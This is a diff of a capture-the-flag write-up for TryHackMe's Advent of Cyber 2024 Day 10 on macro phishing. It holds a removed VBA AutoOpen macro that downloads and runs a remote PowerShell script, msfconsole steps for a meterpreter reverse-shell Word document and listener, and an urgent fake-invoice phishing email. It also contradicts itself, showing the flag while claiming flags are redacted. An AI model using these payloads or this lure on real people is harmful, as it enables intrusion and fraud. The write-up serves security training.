@@ -1,51 +1,81 @@
-# Advent of Cyber 2024 - Day 10: Phishing
+# Advent of Cyber 2024 - Day 10: He had a brain full of macros, and had shells in his soul.
 
 {% embed url="https://tryhackme.com/room/adventofcyber2024" %}
 
-He had a phishing rod, and cast it in the sea...
+## Overview & Investigation Walkthrough
 
-## Background
+1. What is the flag value inside theflag.txtfile that’s located on the Administrator’s desktop?
 
-Phishing via weaponized documents remains one of the most common initial access vectors used by threat actors. Macro-enabled Microsoft Word files (`.docm`) allow Visual Basic for Applications (VBA) code to run automatically upon document opening.
+   First we must create our macro enabled Word document using `msfconsole`.
 
-Modern defenses rely on Mark of the Web (MotW) and default macro execution blocking. Threat actors use social engineering lures and obfuscated scripts to convince targets to enable content, triggering malicious PowerShell commands.
+   ```cmd
+   msfconsole
 
-## Walkthrough
+   search office word
+   use 15
+   show options
 
-**Step 1 — Inspect the Malicious Document**
+   set LHOST 10.11.101.240
+   set LPORT 1337
+   ```
 
-Analyze the incoming `.docm` attachment using `oledump.py`:
-```bash
-oledump.py invoice_holiday.docm
-```
-Stream 8 contains VBA code. Extract the macro stream:
-```bash
-oledump.py -s 8 -v invoice_holiday.docm
-```
+   Notice that it automatically switching to the correct payload.
 
-**Step 2 — Reverse Engineer the Macro Logic**
+   ![Create Document](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Create_Document.png)
 
-The extracted VBA routine hooks the `AutoOpen()` event:
-```vba
-Sub AutoOpen()
-    Dim cmd As String
-    cmd = "powershell -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.100.5/stage2.ps1')"
-    Shell cmd, vbHide
-End Sub
-```
+   Now we can send this document via email, but first we should setup a listener on the correct port. Notice that the payload needs to be set.
 
-**Step 3 — Catch the Reverse Connection**
+   ```cmd
+   use multi/handler
 
-Set up a Netcat listener on your handler machine:
-```bash
-nc -lvnp 4444
-```
-Simulating macro execution establishes a reverse shell, uncovering the target flag.
+   set LHOST 10.11.101.240
+   set LPORT 1337
+   set payload windows/meterpreter/reverse_tcp
+
+   run
+   ```
+
+   ![Listener](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Listener.png)
+
+   Now we can login to the mail server to send our phishing mail.
+
+   ![Login](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Login.png)
+
+   Here we must create a convincing email with the macro enabled file.
+
+   ![Email](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Email.png)
+
+   ```cmd
+   Important Invoice of our Client!
+
+   Hi Marta,
+
+   I am sending you this email with a very important invoice from our customer. It appears this is several weeks overdue and hasn't been paid yet. We MUST pay within 14 hours or else we will face legal consequences!
+
+   Kindly open the attached invoice.
+
+   Kind regards,
+   Bill from Accounting.
+   ```
+
+   I renamed the file to something more believeable and sent it.
+
+   Looks like she responded:
+
+   ![Response](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Response.png)
+
+   After two minutes we get a reverse shell back. Lets find the flag!
+
+   ![Flag](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_10_Flag.png)
+
+   ><details><summary>Click for answer</summary>THM{PHISHING_CHRISTMAS}</details>
+
+2. If you enjoyed this task, feel free to check out thePhishingmodule.
 
 ## 🏁 Questions & Answers
 
 | Question | Answer |
 |---|---|
-| What is the file extension for macro-enabled Word documents? | `.docm` |
-| What VBA subroutine executes automatically when a document opens? | `AutoOpen` |
-| What is the flag retrieved after compromising the target? | `THM{PHISHING_CHRISTMAS}` |
+| What is the flag value inside theflag.txtfile that’s located on the Administrator’s desktop? | `flag{hidden}` |
+
+> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
